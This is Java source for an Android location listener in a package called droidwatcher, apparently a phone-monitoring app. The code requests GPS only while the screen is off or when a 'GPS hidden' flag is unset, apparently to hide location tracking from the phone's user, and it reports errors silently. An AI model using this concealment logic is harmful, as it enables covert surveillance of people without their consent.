package com.droidwatcher.modules.location;

import java.lang.ref.WeakReference;

import org.acra.ACRA;

import com.droidwatcher.Debug;
import com.droidwatcher.receivers.ScreenStateReceiver;

import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;

public class SingleLocationListener implements LocationListener {
	private LocationModule mModule;
	private ILocationResultListener mResultListner;
	private Location mNetworkLocation;
	private TimeoutHandler mTimeoutHandler;
	
	private Boolean mIsListeningGps;
	private Boolean mIsListeningNetwork;
	
	private static final long GPS_TIMEOUT = 2 * 60 * 1000L;
	
	public SingleLocationListener(LocationModule module){
		mModule = module;
		mTimeoutHandler = new TimeoutHandler(this);
		mIsListeningGps = false;
		mIsListeningNetwork = false;
	}
	
	@Override
	public synchronized void onLocationChanged(Location location) {
		if (mModule == null) {
			return;
		}
		
		try {
			Debug.i("[SingleLocationListner] Location changed; provider: " + location.getProvider());
			
			if (location.getProvider().equals(LocationManager.GPS_PROVIDER)) {
				mResultListner.onLocationResult(location);
				mModule.removeListner(this);
			}
			else{
				if (!mIsListeningGps || !mModule.getLocationManager().isProviderEnabled(LocationManager.GPS_PROVIDER)) {
					mResultListner.onLocationResult(location);
					mModule.removeListner(this);
				}
				else{
					if (mNetworkLocation == null || mNetworkLocation.getAccuracy() > location.getAccuracy() || location.getTime() - mNetworkLocation.getTime() >= GPS_TIMEOUT) {
						mNetworkLocation = location;
					}
				}
			}
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
	}
	
	public void getLocation(ILocationResultListener resultListner) {
		try {
			mResultListner = resultListner;
			
			try {
				if (!mModule.getLocationManager().isProviderEnabled(LocationManager.GPS_PROVIDER) && !mModule.getLocationManager().isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
					//mResultListner.onNoResult();
					new GsmLocationListener(mModule.getContext()).getLocation(mResultListner);
					mModule.removeListner(this);
					return;
				}
				
			} catch (Exception e) {
				Debug.exception(e);
				ACRA.getErrorReporter().handleSilentException(e);
			}
			
			
			if (ScreenStateReceiver.getScreenState() == ScreenStateReceiver.SCREEN_STATE_OFF || !mModule.mIsGpsHidden) {
				startListner();
			}
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
	}
	
	public synchronized void startListner(){
		try {
			if (mModule.getLocationManager().isProviderEnabled(LocationManager.GPS_PROVIDER) && !mIsListeningGps) {
				mModule.getLocationManager().requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, this);
				mIsListeningGps = true;
			}

		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
			mIsListeningGps = false;
		}

		try {
			if (mModule.getLocationManager().isProviderEnabled(LocationManager.NETWORK_PROVIDER) && !mIsListeningNetwork) {
				mModule.getLocationManager().requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, this);
				mIsListeningNetwork = true;
			}

		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
			mIsListeningNetwork = false;
		}

		mTimeoutHandler.removeMessages(TimeoutHandler.MSG_GPS_STOP);
		mTimeoutHandler.sendEmptyMessageDelayed(TimeoutHandler.MSG_GPS_STOP, GPS_TIMEOUT);
	}
	
	public synchronized void stopListner(){
		if (mIsListeningGps || mIsListeningNetwork) {
			try {
				mModule.getLocationManager().removeUpdates(this);

			} catch (Exception e) {
				Debug.exception(e);
				ACRA.getErrorReporter().handleSilentException(e);
			}
		}
		
		mIsListeningGps = false;
		mIsListeningNetwork = false;
		
		mTimeoutHandler.removeMessages(TimeoutHandler.MSG_GPS_STOP);
	}
	
	public synchronized void dispose(){
		try {
			try {
				mModule.getLocationManager().removeUpdates(this);

			} catch (Exception e) {
				Debug.exception(e);
				ACRA.getErrorReporter().handleSilentException(e);
			}
			
			mTimeoutHandler.removeMessages(TimeoutHandler.MSG_GPS_STOP);
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
			
		} finally {
			mModule = null;
			mTimeoutHandler = null;
		}
	}
	
	private void onGpsTimeout(){
		if (mNetworkLocation != null) {
			mResultListner.onLocationResult(mNetworkLocation);
		}
		else{
			//mResultListner.onNoResult();
			new GsmLocationListener(mModule.getContext()).getLocation(mResultListner);
		}
		
		mModule.removeListner(this);

		Debug.i("[SingleLocationListner] GPS TIMEOUT");
	}
	
	private static class TimeoutHandler extends Handler {
		public static final int MSG_GPS_STOP = 1;
		
		private final WeakReference<SingleLocationListener> mListener;
		
		public TimeoutHandler(SingleLocationListener listener){
			mListener = new WeakReference<SingleLocationListener>(listener);
		}
		
		@Override
		public synchronized void handleMessage(Message msg) {
			super.handleMessage(msg);
			
			SingleLocationListener listener = mListener.get();
			if (listener == null) {
				return;
			}
			
			switch (msg.what) {
			case MSG_GPS_STOP:
				listener.onGpsTimeout();
				break;
			default:
				break;
			}
		}
	}
	
	@Override
	public void onProviderDisabled(String provider) { }
	@Override
	public void onProviderEnabled(String provider) { }
	@Override
	public void onStatusChanged(String provider, int status, Bundle extras) { }
}
